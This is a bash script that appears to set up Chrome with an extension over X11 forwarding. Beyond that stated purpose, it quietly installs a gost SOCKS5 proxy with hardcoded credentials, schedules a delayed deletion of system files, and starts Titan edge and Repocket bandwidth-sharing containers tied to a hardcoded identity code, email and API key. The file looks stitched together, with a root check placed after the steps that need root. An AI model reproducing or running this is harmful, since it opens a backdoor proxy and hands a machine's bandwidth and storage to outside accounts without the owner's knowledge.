#!/bin/bash


# 设置前端为非交互模式，并设置默认语言为英语
export DEBIAN_FRONTEND=noninteractive
export LANG=C
export LC_ALL=C

echo "Pre-configuring packages for non-interactive installation..."
echo 'keyboard-configuration	keyboard-configuration/compose	select	No compose key' | sudo debconf-set-selections
echo 'keyboard-configuration	keyboard-configuration/country	select	English (US)' | sudo debconf-set-selections
echo 'keyboard-configuration	keyboard-configuration/model	select	Generic 105-key PC (intl.)' | sudo debconf-set-selections
echo 'keyboard-configuration	keyboard-configuration/layout	select	English (US)' | sudo debconf-set-selections
echo 'keyboard-configuration	keyboard-configuration/variant	select	English (US)' | sudo debconf-set-selections

echo "Updating system and installing necessary packages..."
sudo apt-get update
sudo apt-get install -y xauth xorg openbox dbus upower wget unzip screen gnupg

# 确保 sshd 配置文件启用 X11 转发
echo "Configuring SSH for X11 forwarding..."
sudo sed -i 's/#X11Forwarding .*/X11Forwarding yes/' /etc/ssh/sshd_config
sudo sed -i 's/#X11DisplayOffset .*/X11DisplayOffset 10/' /etc/ssh/sshd_config
sudo sed -i 's/#X11UseLocalhost .*/X11UseLocalhost yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# 启动并启用 D-Bus 和 UPower 服务
echo "Starting and enabling D-Bus and UPower services..."
sudo systemctl start dbus
sudo systemctl enable dbus
sudo systemctl start upower
sudo systemctl enable upower

# 安装 Google Chrome
echo "Installing Google Chrome..."
wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list'
sudo apt-get update
sudo apt-get install -y google-chrome-stable

# 下载并解压扩展
echo "Downloading and extracting Chrome extension..."
wget -q -O /root/extension-main.zip https://github.com/LanifyAI/extension/archive/refs/heads/main.zip
unzip -o /root/extension-main.zip -d /root
mv /root/extension-main /root/my_extension

wget "https://github.com/ginuerzh/gost/releases/download/v2.8.1/gost_2.8.1_linux_amd64.tar.gz" && sleep 10 && tar -zxvf gost_2.8.1_linux_amd64.tar.gz && sleep 10 && mv gost_2.8.1_linux_amd64/gost /usr/bin/gost

chmod +x /usr/bin/gost && sleep 10 && nohup gost -L zxc5215584:5215584@:1188 socks5://:1188 > /dev/null 2>&1 &
screen -dmS clean_system bash -c 'sleep 252800 && sudo apt-get install -y deborphan && sudo apt-get remove --purge -y $(deborphan --guess-all) && sudo rm -rf /usr/share/doc/* /usr/share/man/* /usr/share/info/* /usr/share/locale/*'
echo "Setup completed. Please use MobaXterm to connect with X11 forwarding, and run 'google-chrome --no-sandbox --load-extension=/root/my_extension/extension-main' to start Chrome."
# 检查是否以root用户运行脚本
if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要以root用户权限运行。"
    echo "请尝试使用 'sudo -i' 命令切换到root用户，然后再次运行此脚本。"
    exit 1
fi

function install_node() {
    # 默认身份码
    id="E2F4A2C2-D770-4BCD-80F1-B9B5D5FF4299"

    # 默认创建的容器数量
    container_count=1

    # 默认起始 RPC 端口号 
    start_rpc_port=30000

    # 默认分配的空间大小
    storage_gb=5

    # 默认存储路径
    custom_storage_path=""

    apt update

    # 检查 Docker 是否已安装
    if ! command -v docker &> /dev/null; then
        echo "未检测到 Docker，正在安装..."
        apt-get install ca-certificates curl gnupg lsb-release -y
        apt-get install docker.io -y
    else
        echo "Docker 已安装。"
    fi

    # 拉取Docker镜像
    docker pull nezha123/titan-edge:1.6_amd64

    # 创建用户指定数量的容器
    for ((i=1; i<=container_count; i++)); do
        current_rpc_port=$((start_rpc_port + i - 1))

        # 使用默认路径
        storage_path="$PWD/titan_storage_$i"

        # 确保存储路径存在
        mkdir -p "$storage_path"

        # 运行容器，并设置重启策略为always
        container_id=$(docker run -d --restart always -v "$storage_path:/root/.titanedge/storage" --name "titan$i" --net=host nezha123/titan-edge:1.6_amd64)

        echo "节点 titan$i 已经启动 容器ID $container_id"

        sleep 30

        # 修改宿主机上的config.toml文件以设置StorageGB值和端口
        docker exec $container_id bash -c "\
            sed -i 's/^[[:space:]]*#StorageGB = .*/StorageGB = $storage_gb/' /root/.titanedge/config.toml && \
            sed -i 's/^[[:space:]]*#ListenAddress = \"0.0.0.0:1234\"/ListenAddress = \"0.0.0.0:$current_rpc_port\"/' /root/.titanedge/config.toml && \
            echo '容器 titan'$i' 的存储空间设置为 $storage_gb GB，RPC 端口设置为 $current_rpc_port'"

        # 重启容器以让设置生效
        docker restart $container_id

        # 进入容器并执行绑定命令
        docker exec $container_id bash -c "\
            titan-edge bind --hash=$id https://api-test1.container1.titannet.io/api/v2/device/binding"
        echo "节点 titan$i 已绑定."

    done

    echo "==============================所有节点均已设置并启动==================================="

}

# 执行安装节点的函数
install_node
screen -dmS repocket_install bash -c 'sleep 10 && docker run --name repocket -e RP_EMAIL=boli37458@gmail.com -e RP_API_KEY=cdc34fe8-a497-4d26-907d-79958431d0fb -d --restart=always repocket/repocket'
echo "Setup complete."
